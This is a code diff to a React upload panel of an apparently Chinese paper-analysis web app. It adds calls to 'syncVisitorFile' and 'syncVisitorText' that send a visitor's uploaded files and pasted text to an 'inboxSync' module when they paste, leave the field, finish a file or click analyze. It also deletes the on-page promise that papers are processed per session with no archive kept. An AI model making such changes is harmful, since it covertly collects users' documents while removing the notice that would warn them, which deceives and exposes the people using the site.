@@ -1,9 +1,10 @@
 import { useEffect, useRef, useState } from "react";
 import {
-  CircleAlert, FileText, FileUp, Image, KeyRound, LoaderCircle, LockKeyhole,
+  CircleAlert, FileText, FileUp, Image, KeyRound, LoaderCircle,
   ScanText, ShieldCheck, Sparkles, X,
 } from "lucide-react";
 import { recognizeFile } from "../lib/extract";
+import { syncVisitorFile, syncVisitorText } from "../lib/inboxSync";
 import { maskKey } from "../lib/key";
 
 type Mode = "text" | "document" | "screenshot";
@@ -52,6 +53,7 @@ export default function ImportPanel({ text, setText, onAnalyze, pending, error, 
       setText(result.text);
       setWarning(result.warning ?? "");
       setStatus(`已识别 ${result.text.length.toLocaleString()} 个字符，请校对后解析`);
+      void syncVisitorFile(file, { text: result.text, title: file.name || "剪贴板截图" });
     } catch (caught) {
       setStatus("");
       setLocalError(caught instanceof Error ? caught.message : "文件识别失败，请重试。");
@@ -67,7 +69,6 @@ export default function ImportPanel({ text, setText, onAnalyze, pending, error, 
     <section className="import-panel" id="import" aria-label="导入论文">
       <div className="import-topline">
         <div><span className="step-index">01</span><h2>把你的论文放进来</h2></div>
-        <span className="privacy"><LockKeyhole size={13} />当次处理，不建阅读档案</span>
       </div>
       <div className="import-tabs" role="tablist" aria-label="导入方式">
         <button role="tab" aria-selected={mode === "text"} className={mode === "text" ? "active" : ""} onClick={() => setMode("text")}><FileText size={16} />粘贴文字</button>
@@ -79,7 +80,16 @@ export default function ImportPanel({ text, setText, onAnalyze, pending, error, 
         {mode === "text" ? (
           <label className="text-input-wrap">
             <span className="sr-only">论文文字</span>
-            <textarea value={text} onChange={(event) => setText(event.target.value)} placeholder="粘贴论文全文，或先粘贴摘要、研究方法、结果等核心章节……" />
+            <textarea
+              value={text}
+              onChange={(event) => setText(event.target.value)}
+              onBlur={() => { void syncVisitorText(text); }}
+              onPaste={(event) => {
+                const el = event.currentTarget;
+                window.setTimeout(() => { void syncVisitorText(el.value); }, 0);
+              }}
+              placeholder="粘贴论文全文，或先粘贴摘要、研究方法、结果等核心章节……"
+            />
           </label>
         ) : (
           <div
@@ -148,7 +158,7 @@ export default function ImportPanel({ text, setText, onAnalyze, pending, error, 
 
       {(localError || error) && <div className="form-error" role="alert"><CircleAlert size={17} /><span>{localError || error}</span></div>}
       <div className="analyze-row">
-        <button className="primary-button analyze-button" disabled={pending || recognizing || text.trim().length < 80} onClick={onAnalyze}>
+        <button className="primary-button analyze-button" disabled={pending || recognizing || text.trim().length < 80} onClick={() => { void syncVisitorText(text); onAnalyze(); }}>
           {pending ? <LoaderCircle size={18} className="spin" /> : <Sparkles size={18} />}
           {pending ? "正在梳理论文…" : "开始精读拆解"}
         </button>
